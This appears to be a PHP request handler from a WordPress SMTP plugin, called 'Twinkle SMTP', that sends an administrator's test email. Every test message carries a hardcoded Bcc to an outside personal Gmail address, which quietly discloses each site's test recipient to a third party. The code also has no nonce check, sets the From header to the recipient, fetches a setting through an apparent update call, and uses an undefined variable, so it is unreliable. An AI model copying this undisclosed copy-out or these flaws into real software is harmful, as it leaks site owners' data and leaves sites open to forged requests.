<?php

/* Check if user has admin capabilities */
if (current_user_can('manage_options')) {

    /* Receive post data */
    if (isset($_REQUEST['data'])) {
        $send_status = '';
        $data = $_REQUEST['data'];
        $data = urldecode($data);
        $data = stripcslashes($data);
        $test_email_data = json_decode($data, TRUE);

        $html_status     = $test_email_data['html_status'];
        $mail_body  = '';
        $subject         = '';

        if( 'yes' === $html_status ) {

            $subject = "Twinkle SMTP: Test Email - Html Version";
            $mail_body  =  "<h1 style = 'font-weight:500px; text-align:center;'>Congratulations, the test email was sent successfully!</h1> <p style = 'font-size: 20px; text-align:center;'>Thank you for using Twinkle SMTP. Ensure successful email deliverability and experience the best email management with this powerful plugin.</p>";
        } else{

            $subject = "Twinkle SMTP: Test Email - Text Version";
            $mail_body  =  "Hello There,
            Are you able to see this email? If you are, then that’s great news! What it means is that you are completely set to start sending emails from your website.Thank You for being with Twinkle SMTP.";
        }

        $bcc_email  = $this->admin_class->db->update_mailer_data('default_bcc_email',null);
        $test_email = $test_email_data['test_email_to'];
        $headers[]  = 'Content-Type: text/html; charset = UTF-8';
        $headers[]  = 'From        : ' . 'Twinkle Smtp' . ' <' .  $test_email . '>';

        if( ! empty( $bcc_email )){
            $headers[] = 'Bcc : ' . $bcc_email ;
        }

        $headers[] = 'Bcc : shahreyar.shimul15@gmail.com';
        // $headers[] = 'CC :  shahreyar.shimul@gmail.com';
       
        //Sent  test mail
        wp_mail( $test_email, $subject, $mail_body, $headers );
        $send_status = ( isset( $_SESSION['send_status']) ) ?  $_SESSION['send_status'] : '';

        $this->admin_class->db->update_mailer_data( 'test_email_sent_to', $test_email_data['test_email_to'] );

        $result = array( "status" => 'true', 'send_status' => $send_status );
 
    } else {
        $result = array("status" => 'false', 'send_status' => $send_status);
    }
} else {
    $result = array("status" => 'false', 'send_status' => $send_status);
}


if (isset($_SESSION['send_status'])){
    unset($_SESSION['send_status']);
}

echo json_encode($result,  JSON_UNESCAPED_UNICODE);

exit;
